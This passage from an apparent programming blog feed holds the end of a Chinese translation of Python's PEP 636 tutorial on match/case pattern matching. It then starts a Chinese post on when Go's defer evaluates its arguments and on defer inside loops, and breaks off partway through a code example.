&lt;span class="n">ui&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">wait&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">duration&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;sound&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">str&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="s2">&amp;#34;format&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="s2">&amp;#34;ogg&amp;#34;&lt;/span>&lt;span class="p">}:&lt;/span>
&lt;span class="n">ui&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">play&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">url&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">{&lt;/span>&lt;span class="s2">&amp;#34;sound&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="s2">&amp;#34;format&amp;#34;&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">}:&lt;/span>
&lt;span class="n">warning&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Unsupported audio format&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="附录a----快速入门">附录A &amp;ndash; 快速入门&lt;/h2>
&lt;p>&lt;code>match&lt;/code>语句接受一个表达式，并将其值与作为一个或多个&lt;code>case&lt;/code>块给出的模式进行比较。这看起来类似于C、Java或JavaScript(以及许多其他语言)中的&lt;code>switch&lt;/code>语句，但功能要强大得多。&lt;/p>
&lt;p>最简单的形式是将一个 subject 值与一个或多个字面值进行比较:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">def&lt;/span> &lt;span class="nf">http_error&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">status&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">match&lt;/span> &lt;span class="n">status&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="mi">400&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;Bad request&amp;#34;&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="mi">404&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;Not found&amp;#34;&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="mi">418&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;I&amp;#39;m a teapot&amp;#34;&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;Something&amp;#39;s wrong with the Internet&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>注意最后一块:“变量名”&lt;code>_&lt;/code>充当通配符，永远不会失败。&lt;/p>
&lt;p>你可以使用&lt;code>|&lt;/code> (&amp;ldquo;or&amp;rdquo;)将几个字面值组合在一个模式中:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">case&lt;/span> &lt;span class="mi">401&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">403&lt;/span> &lt;span class="o">|&lt;/span> &lt;span class="mi">404&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="s2">&amp;#34;Not allowed&amp;#34;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>模式看起来就像解包赋值，可以用来绑定变量:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="c1"># point is an (x, y) tuple&lt;/span>
&lt;span class="n">match&lt;/span> &lt;span class="n">point&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Origin&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Y=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;X=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;X=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">, Y=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="k">raise&lt;/span> &lt;span class="ne">ValueError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Not a point&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>仔细研究一下那个!第一个模式有两个字面量，可以认为是上面所示字面量模式的扩展。但是接下来的两个模式组合了一个字面量和一个变量，变量绑定来自 subject (&lt;code>point&lt;/code>)的值。第四个模式捕获两个值，这使得它在概念上类似于解包赋值&lt;code>(x, y) = point&lt;/code>。&lt;/p>
&lt;p>如果你使用类来构造数据，你可以使用类名后跟一个类似构造函数的参数列表，但是可以将属性捕获到变量中:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="k">class&lt;/span> &lt;span class="nc">Point&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">x&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>
&lt;span class="n">y&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nb">int&lt;/span>
&lt;span class="k">def&lt;/span> &lt;span class="nf">where_is&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">point&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">match&lt;/span> &lt;span class="n">point&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Origin&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Y=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;X=&lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Point&lt;/span>&lt;span class="p">():&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Somewhere else&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Not a point&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>你可以在一些内置类中使用位置参数，这些类为它们的属性(例如数据类)提供排序。你也可以通过在你的类中设置&lt;code>__match_args__&lt;/code>特殊属性来定义模式中属性的特定位置。如果它被设置为&lt;code>(&amp;quot;x&amp;quot;， &amp;quot;y&amp;quot;)&lt;/code>，以下模式都是等价的(并且都将&lt;code>y&lt;/code>属性绑定到&lt;code>var&lt;/code>变量):&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">var&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="n">var&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">x&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="mi">1&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>模式可以任意嵌套。例如，如果我们有一个简短的点列表，我们可以这样匹配:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">points&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[]:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;No points&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">0&lt;/span>&lt;span class="p">)]:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;The origin&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">)]:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Single point &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">y&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="p">[&lt;/span>&lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y1&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="mi">0&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y2&lt;/span>&lt;span class="p">)]:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Two on the Y axis at &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">y1&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">, &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">y2&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">_&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Something else&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>我们可以向模式添加一个&lt;code>if&lt;/code>子句，称为“guard”。如果 guard 为假，&lt;code>match&lt;/code> 继续尝试下一个&lt;code>case&lt;/code>块。注意，值捕获发生在guard求值之前:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">match&lt;/span> &lt;span class="n">point&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">if&lt;/span> &lt;span class="n">x&lt;/span> &lt;span class="o">==&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Y=X at &lt;/span>&lt;span class="si">{&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="si">}&lt;/span>&lt;span class="s2">&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="sa">f&lt;/span>&lt;span class="s2">&amp;#34;Not on the diagonal&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>其他几个关键功能:&lt;/p>
&lt;ul>
&lt;li>
&lt;p>与解包赋值一样，元组和列表模式具有完全相同的含义，并且实际上匹配任意序列。一个重要的异常是它们&lt;strong>不匹配&lt;/strong>迭代器或字符串。(技术上讲，subject 必须是&lt;code>collections.abc.Sequence&lt;/code>的一个实例。)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>序列模式支持通配符:&lt;code>[x, y， *rest]&lt;/code>和&lt;code>(x, y， *rest)&lt;/code>在解包赋值时的工作类似于通配符。*后面的名称也可以是&lt;code>_&lt;/code>，所以&lt;code>(x, y， *_)&lt;/code>匹配至少有两个项的序列，而不绑定其余的项。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>映射模式:&lt;code>{&amp;quot;bandwidth&amp;quot;: b， &amp;quot;latency&amp;quot;: l}&lt;/code>从字典中捕获&lt;code>&amp;quot;bandwidth&amp;quot;&lt;/code>和&lt;code>&amp;quot;latency&amp;quot;&lt;/code>值。与序列模式不同，额外的键被忽略。还支持通配符&lt;code>**rest&lt;/code>。(但是&lt;code>**_&lt;/code>是多余的，所以不允许。)&lt;/p>
&lt;/li>
&lt;li>
&lt;p>可以使用as关键字捕获子模式:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="n">case&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x1&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y1&lt;/span>&lt;span class="p">),&lt;/span> &lt;span class="n">Point&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">x2&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="n">y2&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="k">as&lt;/span> &lt;span class="n">p2&lt;/span>&lt;span class="p">):&lt;/span> &lt;span class="o">...&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;li>
&lt;p>大多数字面值的比较是&lt;code>==&lt;/code>的，但是单例的&lt;code>True&lt;/code>、&lt;code>False&lt;/code>和&lt;code>None&lt;/code>是通过&lt;code>id&lt;/code>进行比较的。&lt;/p>
&lt;/li>
&lt;li>
&lt;p>模式可以使用命名的常量。这些必须用点命名，以防止它们被解释为捕获变量:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-python" data-lang="python">&lt;span class="kn">from&lt;/span> &lt;span class="nn">enum&lt;/span> &lt;span class="kn">import&lt;/span> &lt;span class="n">Enum&lt;/span>
&lt;span class="k">class&lt;/span> &lt;span class="nc">Color&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="n">Enum&lt;/span>&lt;span class="p">):&lt;/span>
&lt;span class="n">RED&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">0&lt;/span>
&lt;span class="n">GREEN&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">1&lt;/span>
&lt;span class="n">BLUE&lt;/span> &lt;span class="o">=&lt;/span> &lt;span class="mi">2&lt;/span>
&lt;span class="n">match&lt;/span> &lt;span class="n">color&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Color&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">RED&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;I see red!&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Color&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">GREEN&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;Grass is green&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="n">case&lt;/span> &lt;span class="n">Color&lt;/span>&lt;span class="o">.&lt;/span>&lt;span class="n">BLUE&lt;/span>&lt;span class="p">:&lt;/span>
&lt;span class="nb">print&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s2">&amp;#34;I&amp;#39;m feeling the blues :(&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="原文档版权声明">原文档版权声明&lt;/h2>
&lt;p>This document is placed in the public domain or under the CC0-1.0-Universal license, whichever is more permissive.&lt;/p>
&lt;p>Source: &lt;a class="link" href="https://github.com/python/peps/blob/master/pep-0636.rst" target="_blank" rel="noopener"
>https://github.com/python/peps/blob/master/pep-0636.rst&lt;/a>&lt;/p></description></item><item><title>go 的 defer 语句</title><link>https://nnnewb.github.io/blog/p/go-%E7%9A%84-defer-%E8%AF%AD%E5%8F%A5/</link><pubDate>Tue, 05 Jan 2021 10:01:48 +0800</pubDate><guid>https://nnnewb.github.io/blog/p/go-%E7%9A%84-defer-%E8%AF%AD%E5%8F%A5/</guid><description>&lt;p>昨天对项目做了个小重构，主要是对以前手写的 stmt.Close 没处理返回值的问题、还有各种该记录日志的地方没记日志等等，做了下处理。&lt;/p>
&lt;p>老实说这事儿做着做着还有种奇妙的快感，类似于看高压水枪清污视频的感觉。哈哈，也亏领导不管事，代码也不 Review ，测试=摆设。&lt;/p>
&lt;p>这不一上班就发现好多问题，幸好只推送到内网。&lt;/p>
&lt;p>笑中带泪.gif&lt;/p>
&lt;!-- more -->
&lt;h2 id="0x01-问题描述">0x01 问题描述&lt;/h2>
&lt;p>问题倒是挺简单的，看下面的代码。&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="nx">stmt&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">db&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Prepare&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">query&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nf">SilentLogError&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">stmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">(),&lt;/span> &lt;span class="s">&amp;#34;stmt close failed&amp;#34;&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="nx">row&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nx">stmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">QueryRow&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">params&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">row&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="k">if&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">row&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Scan&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">vars&lt;/span>&lt;span class="o">...&lt;/span>&lt;span class="p">);&lt;/span> &lt;span class="nx">err&lt;/span> &lt;span class="o">!=&lt;/span> &lt;span class="kc">nil&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">err&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="nx">vars&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>&lt;p>那么，请问上面的代码有什么问题呢？&lt;/p>
&lt;p>标题都说了 defer 了，那问题肯定是出在 defer 这一行上。&lt;/p>
&lt;h2 id="0x02-defer-的求值">0x02 defer 的求值&lt;/h2>
&lt;p>简单的结论就是: &lt;em>defer f() 的参数在 defer 这一行求值&lt;/em>&lt;/p>
&lt;p>具体到上面的例子，&lt;code>defer f(i())&lt;/code> 这样的形式，可以先分成三个部分。&lt;/p>
&lt;ol>
&lt;li>&lt;code>defer&lt;/code> 本身的执行时机&lt;/li>
&lt;li>&lt;code>i()&lt;/code> 的求值时机&lt;/li>
&lt;li>&lt;code>f()&lt;/code> 的求值时机&lt;/li>
&lt;/ol>
&lt;p>把这三部分排一下序:&lt;/p>
&lt;ol>
&lt;li>&lt;code>i()&lt;/code>&lt;/li>
&lt;li>&lt;code>defer&lt;/code>
&lt;blockquote>
&lt;p>defer 把参数求值后包装成一个新函数延迟执行&lt;/p>
&lt;/blockquote>
&lt;/li>
&lt;li>&lt;code>f()&lt;/code>&lt;/li>
&lt;/ol>
&lt;h2 id="0x03-循环内-defer">0x03 循环内 defer&lt;/h2>
&lt;p>循环内 defer 主要有两个问题&lt;/p>
&lt;ol>
&lt;li>可能产生造成巨量的 defer 函数，耗尽内存或拖垮执行速度&lt;/li>
&lt;li>在一些情况下会造成意料外的结果&lt;/li>
&lt;/ol>
&lt;p>看例子&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-go" data-lang="go">&lt;span class="kn">package&lt;/span> &lt;span class="nx">main&lt;/span>
&lt;span class="kn">import&lt;/span> &lt;span class="s">&amp;#34;fmt&amp;#34;&lt;/span>
&lt;span class="kd">type&lt;/span> &lt;span class="nx">Conn&lt;/span> &lt;span class="kd">struct&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">ID&lt;/span> &lt;span class="kt">int&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">NewConn&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="nx">id&lt;/span> &lt;span class="kt">int&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Conn&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="o">&amp;amp;&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">{&lt;/span>&lt;span class="nx">ID&lt;/span>&lt;span class="p">:&lt;/span> &lt;span class="nx">id&lt;/span>&lt;span class="p">}&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="p">(&lt;/span>&lt;span class="nx">c&lt;/span> &lt;span class="o">*&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">)&lt;/span> &lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="kt">error&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">fmt&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Printf&lt;/span>&lt;span class="p">(&lt;/span>&lt;span class="s">&amp;#34;close %d!\n&amp;#34;&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">c&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nx">ID&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">return&lt;/span> &lt;span class="kc">nil&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="kd">func&lt;/span> &lt;span class="nf">main&lt;/span>&lt;span class="p">()&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">arr&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="nb">make&lt;/span>&lt;span class="p">([]&lt;/span>&lt;span class="nx">Conn&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="mi">5&lt;/span>&lt;span class="p">)&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">i&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">arr&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="nx">arr&lt;/span>&lt;span class="p">[&lt;/span>&lt;span class="nx">i&lt;/span>&lt;span class="p">].&lt;/span>&lt;span class="nx">ID&lt;/span> &lt;span class="p">=&lt;/span> &lt;span class="nx">i&lt;/span>
&lt;span class="p">}&lt;/span>
&lt;span class="k">for&lt;/span> &lt;span class="nx">_&lt;/span>&lt;span class="p">,&lt;/span> &lt;span class="nx">conn&lt;/span> &lt;span class="o">:=&lt;/span> &lt;span class="k">range&lt;/span> &lt;span class="nx">arr&lt;/span> &lt;span class="p">{&lt;/span>
&lt;span class="k">defer&lt;/span> &lt;span class="nx">conn&lt;/span>&lt;span class="p">.&lt;/span>&lt;span class="nf">Close&lt;/span>&lt;span class="p">()&lt;/span>
&lt;span class="p">}&lt;/span>
